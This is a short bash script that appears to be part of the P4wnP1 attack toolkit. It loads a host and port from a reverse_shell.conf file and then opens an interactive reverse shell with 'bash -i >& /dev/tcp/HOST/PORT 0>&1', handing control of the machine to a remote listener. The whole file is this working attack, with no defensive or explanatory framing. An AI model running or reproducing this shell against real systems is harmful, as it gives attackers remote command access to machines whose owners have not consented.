#!/bin/bash

P4WN_HOME="${P4WN_HOME:-/opt/p4wnp1}"
CONFIG="$P4WN_HOME/config/reverse_shell.conf"
[ -f "$CONFIG" ] && source "$CONFIG"

HOST="${RS_HOST}"
PORT="${RS_PORT}"

bash -i >& /dev/tcp/${HOST}/${PORT} 0>&1
